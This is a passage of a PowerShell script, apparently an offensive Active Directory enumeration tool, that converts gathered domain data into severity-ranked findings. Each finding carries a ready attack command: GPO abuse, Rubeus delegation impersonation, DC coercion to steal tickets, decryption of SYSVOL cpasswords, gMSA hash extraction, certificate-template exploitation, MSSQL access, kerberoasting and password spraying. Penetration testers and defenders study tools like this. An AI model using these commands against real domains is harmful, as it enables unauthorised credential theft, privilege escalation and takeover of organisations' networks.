    if ($gpoOther) { Add-Finding 'HIGH' 'GPOs this account can edit (GPO abuse)' $gpoOther `
        "check which OUs/hosts the GPO is linked to, then SharpGPOAbuse.exe --AddLocalAdmin / --AddComputerTask to land on them" }
}

$unc = $Data['09-unconstrained'] | Where-Object { $_.sAMAccountName -and $_.sAMAccountName -notmatch "^$($DcName.Split('.')[0])\$" }
if ($unc) { Add-Finding 'HIGH' 'Unconstrained delegation' $unc `
    "if you get admin on that host, coerce a DC (PetitPotam/PrinterBug) and capture its TGT" }

$con = $Data['10-constrained']
if ($con) { Add-Finding 'HIGH' 'Constrained delegation' $con `
    "Rubeus.exe s4u to impersonate a privileged user to the allowed service" }

$rbcd = $Data['10b-rbcd']
if ($rbcd) { Add-Finding 'HIGH' 'Resource-based constrained delegation (RBCD) configured' $rbcd `
    "if you control the trusted principal: Rubeus.exe s4u (or impacket getST from Kali) to impersonate any user to that object" }

# credentials sitting in the open
$pwAttr = $Data['12c-pw-attrs'] | Where-Object { $_.userPassword -or $_.unixUserPassword }
if ($pwAttr) { Add-Finding 'CRIT' 'Password stored in an LDAP attribute' $pwAttr `
    "userPassword/unixUserPassword are often base64; decode and test with nxc smb $DcName -u <user> -p '<pass>'" }

$gpp = $Data['17-sysvol-gpp'] | Where-Object { $_.cpassword }
if ($gpp) { Add-Finding 'CRIT' 'cpassword in SYSVOL (Group Policy Preferences)' $gpp `
    "decrypt on Kali (public AES key): gpp-decrypt '<cpassword>'  -> it is a LOCAL admin password, use --local-auth" }

# service accounts / quotas
$gmsa = $Data['16-gmsa'] | Select-Object sAMAccountName,servicePrincipalName
if ($gmsa) { Add-Finding 'HIGH' 'gMSA accounts present' $gmsa `
    "if your token is in msDS-GroupMSAMembership you own the hash: nxc ldap <dc> -u <user> -p <pass> --gmsa  (from Kali)" }

$maqRow = $Data['16b-maq'] | Select-Object -First 1
if ($maqRow) {
    $maqVal = 0; [void][int]::TryParse(("$($maqRow.'ms-DS-MachineAccountQuota')").Trim(),[ref]$maqVal)
    if ($maqVal -gt 0) { Add-Finding 'HIGH' "ms-DS-MachineAccountQuota = $maqVal (any user can add a computer)" $maqRow `
        "prerequisite for RBCD and for a fake computer in shadow-credential chains" }
    else { Add-Finding 'INFO' 'ms-DS-MachineAccountQuota = 0 (users cannot add computers)' $maqRow '' }
}

$adcs = $Data['16c-adcs'] | Select-Object name,dNSHostName
if ($adcs) { Add-Finding 'INFO' 'AD CS present (certificate authority)' $adcs `
    "analyse templates for ESC1-8 from Kali: certipy-ad find -vulnerable -u <user>@<domain> -p '<pass>' -dc-ip <dc>" }

# MSSQL: the full enum (sysadmin? linked servers? xp_cmdshell) is Kali-side
# (ad-enum.sh 27-mssql-*), but the MSSQLSvc SPNs already tell us where it runs.
$mssql = $Data['07-spn'] | Where-Object { $_.servicePrincipalName -match '(?i)MSSQLSvc' } |
    Select-Object sAMAccountName,servicePrincipalName
if ($mssql) { Add-Finding 'HIGH' 'MSSQL instance(s) present (MSSQLSvc SPN)' $mssql `
    "from Kali: nxc mssql <host> -u <user> -p '<pass>' -d <domain> -M mssql_priv  |  impacket-mssqlclient <domain>/<user>@<host> -windows-auth" }

$adm = $Data['11-admincount'] | Select-Object sAMAccountName
if ($adm) { Add-Finding 'INFO' 'Privileged accounts (adminCount=1)' $adm `
    "these are the crown jewels: kerberoast them, or find a host where they are logged on" }

$noexp = $Data['12b-neverexpires'] | Select-Object sAMAccountName
if ($noexp) { Add-Finding 'INFO' 'Password never expires (stale, often weak)' $noexp `
    "good spray candidates once you know the lockout policy (00-passpol)" }

$trustLines = $Data['02-trusts'] | Where-Object { $_.name -or ($_.Line -and $_.Line -match 'Trusted|Direction') }
if ($trustLines) { Add-Finding 'INFO' 'Domain trusts' $trustLines `
    "enumerate the trusted domain too - foreign group membership is a lateral path" }

# --------------------------------------------------------- write + print ---
$sumFile = Join-Path $OutDir 'SUMMARY.txt'
$order = @{ 'CRIT'=0; 'HIGH'=1; 'INFO'=2 }
$sorted = $Findings | Sort-Object { $order[$_.Sev] }
"" | Set-Content -Encoding UTF8 $sumFile
foreach ($f in $sorted) {
    $tag = switch($f.Sev){ 'CRIT'{'[CRITICAL]'} 'HIGH'{'[HIGH]    '} default{'[INFO]    '} }
    $col = switch($f.Sev){ 'CRIT'{'Red'} 'HIGH'{'Yellow'} default{'Green'} }
    $bodyText = ($f.Body | Format-List | Out-String).Trim()
    Add-Content $sumFile "`n### $tag $($f.Title)`n$bodyText`n`n>> NEXT: $($f.Next)"
    Say "`n$tag $($f.Title)" $col
    ($bodyText -split "`n") | Select-Object -First 8 | ForEach-Object { Say "    $_" }
    if (($bodyText -split "`n").Count -gt 8) { Say "    ... more in SUMMARY.txt" 'DarkYellow' }
    Say "    >> NEXT: $($f.Next)" 'Cyan'
}

Section 'RUN REPORT'
Say ("  OK {0}   no results {1}   failed {2}" -f $N_OK,$N_EMPTY,$N_FAIL) 'Gray'
if ($sorted) {
    Section 'TOP FINDINGS - start here'
    foreach ($f in $sorted | Where-Object { $_.Sev -ne 'INFO' }) {
        $col = if($f.Sev -eq 'CRIT'){'Red'}else{'Yellow'}
        Say ("  [{0}] {1}" -f $f.Sev,$f.Title) $col
    }
}
Say ("`n[+] done. Full output in {0}  (summary: SUMMARY.txt)" -f $OutDir) 'Green'
Say  "[*] to retrieve a file over a shell:  type $OutDir\SUMMARY.txt   (or base64 it)" 'Cyan'
Say  "[*] for the 'who is admin where' map, run SharpHound under this token: SharpHound.exe -c All  (uploads a zip for BloodHound)" 'Cyan'
